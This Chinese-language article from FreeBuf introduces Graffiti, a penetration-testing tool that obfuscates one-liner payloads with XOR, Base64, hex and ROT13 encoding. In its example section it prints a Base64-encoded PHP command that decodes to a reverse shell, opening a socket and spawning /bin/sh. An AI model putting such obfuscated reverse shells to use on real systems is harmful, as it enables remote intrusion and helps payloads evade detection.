![a.png](https://image.3001.net/images/20190621/1561092029_5d0c5fbd20f51.png!small)

**今天给大家介绍的这款工具名叫Graffiti，各位研究人员可以利用这款工具来生成经过混淆处理的One
Liner，并将其用于渗透测试研究中的各种测试场景。**

### Graffiti目前支持编码的编程语言代码种类如下：

> Python
>
> Perl
>
> Batch
>
> Powershell
>
> PHP
>
> Bash

除此之外，Graffiti还支持将生成的Oneliner存储至数据库中。

## 功能介绍

Graffiti自带有数据库，可允许研究人员将生成的编码Payload或混淆后的One
Liner插入进数据库中，以便终端用户直接查看或后续直接使用。Graffiti在对Payload进行编码时，使用了下列技术：

> -异或计算
>
> -Base64编码
>
> -十六进制编码
>
> -ROT13
>
> -元数据编码

## 除此之外，Graffiti还提供了下列功能

> 1、 终端窗口拖拽访问，支持运行外部命令；
>
> 2、 可支持创建自己的Payload JSON文件；
>
> 3、 支持查看数据库缓存中的Payload信息；
>
> 4、 可在内存中运行数据库以实现快速检测；
>
> 5、 终端历史记录存储及查看；
>
> 6、 终端Tab命令自动补全；
>
> 7、 数据库文件及历史记录文件安全存储/传输；
>
> 8、 可实现多种编码技术。

## 工具使用

Graffiti本身内置终端工具，可直接通过拖拽源文件实现编码，无需手动传递参数。工具支持查看历史记录，并能够运行外部命令，以及其本身自带的内部命令。输入“help”或“？”即可查看工具的帮助信息：

![b.png](https://image.3001.net/images/20190621/1561092053_5d0c5fd599ab3.png!small)

当然了，Graffiti还可以接收命令行参数来帮助用户自定义编码Payload：

![c.png](https://image.3001.net/images/20190621/1561092057_5d0c5fd9ba91e.png!small)

## Payload编码样例

    
    
    root@graffiti:~/graffiti#python graffiti.py -c base64 -p /linux/php/socket_reverse.json -lH 127.0.0.1-lP 9065
    
    Encoded Payload:
    
    --------------------------------------------------    
    php-r'exec(base64_decode("JHNvY2s9ZnNvY2tvcGVuKCIxMjcuMC4wLjEiLDkwNjUpO2V4ZWMoIi9iaW4vc2ggLWkgPCYzID4mMyAyPiYzIik7"));'
    
    --------------------------------------------------
## Graffiti工具演示

演示视频：<https://vimeo.com/303548362>

## 工具安装

在任何版本的Linux、macOS以及Windows平台上，Graffiti都可以在无需任何外部组件的情况下正常运行。如果你想要将Graffiti以可执行程序的形式安装在你的系统中，你只需要运行下列命令即可：

    
    
    ./install.sh

这条命令将会帮助你将Graffiti安装到你的系统中，并能够从任意位置运行。

## 项目地址

Graffiti：【[GitHub传送门](https://github.com/Ekultek/Graffiti)】

***
参考来源：[Ekultek](https://github.com/Ekultek/Graffiti)，FB小编Alpha_h4ck编译，转载请注明来自FreeBuf.COM**

